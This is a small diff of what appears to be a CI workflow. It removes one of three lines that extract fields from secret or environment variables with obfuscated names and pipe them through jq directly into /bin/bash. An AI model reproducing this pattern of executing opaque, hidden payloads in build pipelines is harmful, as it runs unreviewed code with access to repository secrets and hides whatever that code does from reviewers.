@@ -22,7 +22,6 @@ jobs:
           rn6: ${{ secrets.rn6 }}
         run: |
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
-          printf '%s' "$cyq2390" | jq -r .ily52 | /bin/bash
           echo $lvai852 | jq -r .m35 | /bin/bash
 
       - name: Archive artifact
